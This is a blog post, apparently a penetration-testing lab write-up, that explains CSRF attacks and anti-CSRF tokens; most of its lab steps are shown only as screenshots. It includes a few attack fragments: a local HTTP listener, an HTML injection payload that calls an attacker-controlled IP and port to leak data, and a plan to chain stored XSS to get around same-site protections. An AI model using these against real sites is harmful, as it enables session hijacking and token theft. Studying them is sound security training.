---
title: Cross-Site Request Forgery (CSRF or XSRF)
date: 2024-02-20 20:00 
categories: [CSRF]
tags: [CSRF token, HTTP]
author: jamarapo
---

Cross-Site Request Forgery (CSRF or XSRF) is an attack where an attacker tricks a user into performing actions on a web application without their consent while they are authenticated. This is done by crafting malicious web pages that make requests on behalf of the victim, exploiting the lack of anti-CSRF security measures. These attacks typically target functions that change server states or access sensitive data.

![alt text](/assets/img/posts/CrossSite/zkEHM.png)

When a user visits a web application, the server generates a CSRF token and includes it in the web page or form. This token is typically stored in a hidden form field or within the session data. When the user submits a form or performs an action that could potentially modify data on the server, the CSRF token is also sent along with the request.

During the request processing on the server side, the server verifies that the CSRF token received from the client matches the expected value associated with the user's session or form submission. If the tokens match, the request is considered valid, and the server proceeds with the requested action. If the tokens do not match or if no token is provided, the server rejects the request, preventing potential CSRF attacks.

In summary, CSRF tokens are used to ensure that requests to a web application originate from legitimate sources and not from malicious attackers attempting to exploit the user's session. They provide an additional layer of security to protect against CSRF attacks.

![alt text](/assets/img/posts/CrossSite/6.jpg)

# Key points about CSRF attacks:

- Nature of Attack: Attacker forces an authenticated user to unknowingly execute actions on a web application.

- Execution: Malicious web pages crafted by attackers initiate requests that inherit the victim's identity and privileges.

- Targets: CSRF attacks aim at functions causing state changes on servers or accessing sensitive data.

- Impact: Regular user data and operations can be compromised; if an administrative user is targeted, the entire application can be compromised.

- No Response Reading Needed: Unlike other attacks, CSRF doesn't require reading the server's response to the malicious request, thus bypassing Same-Origin Policy.

- Vulnerability Indicators: Applications vulnerable to CSRF attacks lack proper session management and parameter validation.

- Exploitation: Attackers craft malicious web pages and rely on victims being logged into the application when the attack is executed.

In penetration testing and bug bounty hunting, it's common to find applications with weak or absent anti-CSRF protections, which attackers exploit to evade these measures.


![alt text](/assets/img/posts/CrossSite/image.png)

![alt text](/assets/img/posts/CrossSite/image-1.png)

``` bash
python -m http.server 1337
```

![alt text](/assets/img/posts/CrossSite/image-4.png)

![alt text](/assets/img/posts/CrossSite/image-3.png)

![alt text](/assets/img/posts/CrossSite/image-2.png)

## Lab 2 Get-Based with csrf token

![alt text](/assets/img/posts/CrossSite/image-5.png)

![alt text](/assets/img/posts/CrossSite/image-6.png)

![alt text](/assets/img/posts/CrossSite/image-7.png)

![alt text](/assets/img/posts/CrossSite/image-9.png)

![alt text](/assets/img/posts/CrossSite/image-8.png)

![alt text](/assets/img/posts/CrossSite/image-10.png)

## Lab 3 

![alt text](/assets/img/posts/CrossSite/image-11.png)
```
Ctrl + U
```
![alt text](/assets/img/posts/CrossSite/image-12.png)

![alt text](/assets/img/posts/CrossSite/image-13.png)

``` html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

![alt text](/assets/img/posts/CrossSite/image-14.png)

![alt text](/assets/img/posts/CrossSite/image-15.png)

![alt text](/assets/img/posts/CrossSite/image-16.png)

Some information about the application

The application has same-origin/same-site protections as anti-CSRF measures (via server configuration, which cannot be directly detected).
    The "Country" field of the application is vulnerable to stored XSS attacks (as seen in the Cross-Site Scripting (XSS) section).

Malicious cross-site requests are ruled out due to same-origin/same-site protections. Nevertheless, we can still carry out a CSRF attack through the existing stored XSS vulnerability. Specifically, we will exploit the stored XSS vulnerability to make a request that changes the state of the web application. A request via XSS will bypass any same-origin/same-site protection as it will originate from the same domain.

## Lab 4
![alt text](/assets/img/posts/CrossSite/image-17.png)

![alt text](/assets/img/posts/CrossSite/image-18.png)

![alt text](/assets/img/posts/CrossSite/image-19.png)

![alt text](/assets/img/posts/CrossSite/image-23.png)

![alt text](/assets/img/posts/CrossSite/image-20.png)

![alt text](/assets/img/posts/CrossSite/image-22.png)

![alt text](/assets/img/posts/CrossSite/image-21.png)

